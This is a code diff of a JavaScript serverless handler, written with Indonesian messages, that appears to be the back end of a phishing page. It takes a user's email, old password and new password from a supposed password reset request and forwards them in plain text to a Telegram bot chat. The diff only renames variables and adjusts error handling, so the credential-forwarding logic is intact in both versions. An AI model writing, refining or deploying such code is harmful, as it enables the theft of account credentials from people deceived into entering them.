@@ -9,38 +9,38 @@ export default async function handler(req, res) {
     return res.status(400).json({ message: 'Data tidak lengkap' });
   }
 
-  const botToken = process.env.BOT_TOKEN;
+  const token = process.env.BOT_TOKEN;
   const chatId = process.env.CHAT_ID;
 
-  if (!botToken || !chatId) {
-    console.error('❌ BOT_TOKEN atau CHAT_ID tidak tersedia');
-    return res.status(500).json({ message: 'Server error: Token atau chat ID tidak diatur' });
+  if (!token || !chatId) {
+    console.error("❌ BOT_TOKEN atau CHAT_ID tidak tersedia");
+    return res.status(500).json({ message: 'Server error: token atau chatId kosong' });
   }
 
   const text = `
 🔒 Permintaan Reset Password:
 📧 Email: ${email}
-🔑 Sandi Lama: ${oldPass}
-🆕 Sandi Baru: ${newPass}
+🔑 Kata Sandi Lama: ${oldPass}
+🆕 Kata Sandi Baru: ${newPass}
 `;
 
   try {
-    const telegramRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ chat_id: chatId, text })
     });
 
-    const data = await telegramRes.json();
+    const result = await tgRes.json();
 
-    if (!telegramRes.ok) {
-      console.error("❌ Gagal kirim ke Telegram:", data);
-      throw new Error(data.description || 'Gagal');
+    if (!tgRes.ok) {
+      console.error("❌ Gagal kirim ke Telegram:", result);
+      return res.status(500).json({ message: 'Gagal kirim ke Telegram', error: result });
     }
 
     res.status(200).json({ message: 'Berhasil' });
   } catch (err) {
     console.error("❌ Error:", err);
-    res.status(500).json({ message: 'Gagal kirim ke Telegram' });
+    res.status(500).json({ message: 'Internal error', error: err.message });
   }
 }
